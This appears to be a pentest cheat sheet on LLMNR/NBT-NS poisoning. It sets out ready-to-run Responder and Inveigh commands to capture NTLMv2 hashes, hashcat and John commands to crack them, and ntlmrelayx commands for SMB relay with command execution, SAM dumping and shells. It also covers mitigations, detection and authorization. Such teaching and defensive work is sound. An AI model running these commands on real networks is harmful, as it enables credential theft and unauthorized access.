# LLMNR Poisoning

Exploit Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) to capture authentication credentials.
LLMNR poisoning is a man-in-the-middle attack that intercepts name resolution requests when DNS fails, capturing NTLMv2 hashes for offline cracking or relay attacks.

## Quick Reference

```bash
# Responder - capture credentials
sudo responder -I eth0 -wf

# Inveigh (Windows) - capture credentials
Invoke-Inveigh -ConsoleOutput Y -FileOutput Y

# Crack captured NTLMv2 hash
hashcat -m 5600 -a 0 captured.hash rockyou.txt
```

## Responder

```bash
# Basic LLMNR/NBT-NS poisoning
sudo responder -I eth0

# With wpad and force authentication
sudo responder -I eth0 -wf

# Analyze mode (passive, no poisoning)
sudo responder -I eth0 -A

# Disable specific services
sudo responder -I eth0 -d -w

# View captured hashes
cat /usr/share/responder/logs/*.txt

# Extract NTLMv2 hashes
grep "NTLMv2" /usr/share/responder/logs/*.txt

# Get last 2 captured hashes
tail -n 2 /usr/share/responder/logs/*NTLM*.txt
```

## Inveigh (Windows)

```powershell
# PowerShell version (legacy)
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y

# C# version (recommended)
.\Inveigh.exe

# With specific options
.\Inveigh.exe -LLMNR Y -NBNS Y -mDNS Y -FileOutput Y

# Stop Inveigh
Stop-Inveigh

# View captured credentials
Get-Inveigh

# Clear captured credentials
Clear-Inveigh
```

## Hash Cracking

```bash
# Identify hash type (NTLMv2)
hashid captured.hash

# Crack with Hashcat (mode 5600 = NTLMv2)
hashcat -m 5600 -a 0 captured.hash rockyou.txt

# Crack with rules
hashcat -m 5600 -a 0 captured.hash rockyou.txt -r best64.rule

# Crack with John
john --wordlist=rockyou.txt --format=netntlmv2 captured.hash

# Show cracked
hashcat -m 5600 captured.hash --show
```

## SMB Relay Attack

```bash
# Check for SMB signing (required for relay)
nmap --script smb-security-mode -p445 10.10.10.0/24

# Create targets file (hosts without SMB signing)
echo "10.10.10.10" > targets.txt
echo "10.10.10.11" >> targets.txt

# Setup ntlmrelayx
impacket-ntlmrelayx -tf targets.txt -smb2support

# With command execution
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"

# Dump SAM database
impacket-ntlmrelayx -tf targets.txt -smb2support --sam

# Interactive shell
impacket-ntlmrelayx -tf targets.txt -smb2support -i

# With socks proxy
impacket-ntlmrelayx -tf targets.txt -smb2support -socks

# Disable HTTP server (SMB only)
impacket-ntlmrelayx -tf targets.txt -smb2support --no-http-server

# Disable SMB server (HTTP only)
impacket-ntlmrelayx -tf targets.txt --no-smb-server
```

## Combined Attack Workflow

```bash
# Terminal 1: Setup ntlmrelayx
impacket-ntlmrelayx -tf targets.txt -smb2support

# Terminal 2: Run Responder (disable SMB/HTTP to avoid conflict)
sudo responder -I eth0 -d -w

# Wait for authentication events
# Responder captures and relays to ntlmrelayx
# ntlmrelayx attempts to authenticate to targets
```

## Mitigation Verification

```bash
# Check if LLMNR is disabled (PowerShell)
$(Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows NT\DNSClient" -name EnableMulticast).EnableMulticast
# Should return: 0

# Check if NBT-NS is disabled (cmd)
wmic nicconfig get caption,index,TcpipNetbiosOptions
# Should return: 2

# Check SMB signing status
nmap --script smb-security-mode -p445 10.10.10.10
# Should show: Message signing enabled and required
```

## Notes

**How LLMNR Poisoning Works:**

1. **DNS Failure**: User types incorrect server name (e.g., `\\file\` instead of `\\fileserver\`)
2. **Fallback**: Windows falls back to LLMNR/NBT-NS for name resolution
3. **Broadcast**: Client broadcasts "Who has \\file\?" on local network
4. **Poisoning**: Attacker responds "I am \\file\, my IP is X.X.X.X"
5. **Connection**: Client connects to attacker's machine
6. **Authentication**: Client sends NTLMv2 hash for authentication
7. **Capture**: Attacker captures hash for cracking or relay

**Protocols Involved:**

- **LLMNR** (Link-Local Multicast Name Resolution):
  - Successor to NetBIOS
  - UDP port 5355
  - Multicast to 224.0.0.252 (IPv4) or FF02::1:3 (IPv6)
  - Used when DNS fails

- **NBT-NS** (NetBIOS Name Service):
  - Legacy protocol
  - UDP port 137
  - Broadcast-based
  - Older Windows systems

- **mDNS** (Multicast DNS):
  - UDP port 5353
  - Used by Apple devices
  - Also vulnerable to poisoning

**What Gets Captured:**

Responder captures:
- Username
- Domain name
- NTLMv2 hash (challenge-response)
- Client IP address
- Timestamp

Example captured hash:
```
admin::DOMAIN:1122334455667788:A1B2C3D4E5F6...
```

**Hash Format:**

NTLMv2 format:
```
username::domain:challenge:response
```

For Hashcat (mode 5600):
```
admin::INLANEFREIGHT:17bd3616ae5ae735:37445EA686F4F4AB31A926CE8DC9337B:0101000000000000...
```

**SMB Relay vs LLMNR Poisoning:**

| Feature | LLMNR Poisoning | SMB Relay |
|---------|----------------|-----------|
| Target | Name Resolution | Authentication |
| Mechanism | Intercepts broadcasts | Relays authentication |
| Type | Passive interception | Active MITM |
| Scope | Local network | Can move across network |
| Objective | Capture credentials | Gain unauthorized access |
| Credential Use | Offline cracking | Access other systems |

**SMB Relay Requirements:**

For SMB relay to work:
1. SMB signing must be disabled or not required
2. Relayed user must have admin rights on target
3. Cannot relay back to same machine
4. Target must allow SMB connections

Check SMB signing:
```bash
nmap --script smb-security-mode -p445 10.10.10.10
```

Look for:
- `Message signing enabled but not required` = Vulnerable
- `Message signing enabled and required` = Not vulnerable

**Responder Modes:**

- **Default mode**: Active poisoning, captures hashes
- **Analyze mode (-A)**: Passive listening, no poisoning
- **Force WPAD (-w)**: Force WPAD authentication
- **Force authentication (-f)**: Force Basic auth

**Common Scenarios:**

1. **User typo**: `\\fileserver\` → `\\file\`
2. **Bookmark error**: Old bookmark to decommissioned server
3. **Script error**: Hardcoded server name that doesn't exist
4. **Application**: App tries to connect to non-existent share
5. **Scheduled task**: Task references old server name

**Success Indicators:**

Responder output:
```
[SMB] NTLMv2-SSP Client   : 10.10.10.50
[SMB] NTLMv2-SSP Username : DOMAIN\user
[SMB] NTLMv2-SSP Hash     : user::DOMAIN:hash...
```

**Cracking Success Rates:**

Typical success rates:
- Weak passwords (Password123!): 80-90%
- Medium complexity: 40-60%
- Strong passwords (16+ chars): 5-20%

**Mitigation Strategies:**

1. **Disable LLMNR**:
   - Group Policy: Computer Configuration → Administrative Templates → Network → DNS Client
   - Enable "Turn OFF Multicast Name Resolution"

2. **Disable NBT-NS**:
   - PowerShell script in GPO Startup Scripts:
   ```powershell
   $regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
   Get-ChildItem $regkey | foreach { 
       Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 
   }
   ```

3. **Enable SMB Signing**:
   - Require SMB signing on all systems
   - Prevents relay attacks

4. **Network Access Control (NAC)**:
   - Authenticate devices before network access
   - Limits attacker's ability to poison

5. **Strong Passwords**:
   - 14+ characters
   - Complex requirements
   - Makes cracking harder

**Detection Methods:**

Monitor for:
- Multiple LLMNR responses from same IP
- LLMNR responses from unexpected IPs
- Unusual SMB authentication patterns
- Failed authentication attempts
- Network traffic to unusual IPs

**Tools Comparison:**

- **Responder**:
  - Most popular
  - Python-based
  - Linux/Windows
  - Active development
  - Easy to use

- **Inveigh**:
  - Windows-native
  - PowerShell and C# versions
  - Better Windows integration
  - Can run as service
  - Less detection

**Post-Capture Actions:**

Once hashes captured:
1. Save hashes securely
2. Attempt to crack offline
3. Try password spraying with cracked passwords
4. Check for password reuse
5. Attempt SMB relay if signing disabled
6. Document findings

**Common Pitfalls:**

- Running Responder with SMB/HTTP when using ntlmrelayx (conflict)
- Not checking SMB signing before relay attempt
- Forgetting to save captured hashes
- Not monitoring Responder output
- Running too long (increases detection risk)
- Not testing in isolated environment first

**Ethical Considerations:**

- Only perform with authorization
- Understand impact on network
- Don't cause denial of service
- Secure captured credentials
- Document all activities
- Follow rules of engagement

**Advanced Techniques:**

1. **WPAD Poisoning**:
   - Poison Web Proxy Auto-Discovery
   - Capture HTTP authentication
   - More credentials captured

2. **IPv6 Attacks**:
   - Many networks don't monitor IPv6
   - Use mitm6 for IPv6 DNS takeover
   - Combine with ntlmrelayx

3. **Targeted Poisoning**:
   - Respond only to specific hosts
   - Reduces noise
   - Lower detection risk

**Troubleshooting:**

Common issues:
- **No hashes captured**: Check network connectivity, verify LLMNR/NBT-NS enabled
- **Relay fails**: Check SMB signing, verify admin rights
- **Responder conflicts**: Disable SMB/HTTP when using ntlmrelayx
- **Hash won't crack**: Try different wordlists, use rules

**Legal and Compliance:**

- Requires explicit authorization
- Document in rules of engagement
- May violate privacy laws if unauthorized
- Secure all captured data
- Follow data retention policies
- Report findings professionally

**Real-World Impact:**

LLMNR poisoning is:
- Common in penetration tests
- Often successful (60-80% success rate)
- Low-hanging fruit
- Easy to execute
- Hard to detect without proper monitoring
- Can lead to domain compromise

**Remediation Priority:**

High priority because:
- Easy to exploit
- Common in networks
- Can capture admin credentials
- Leads to lateral movement
- Simple to fix
- Low impact on operations
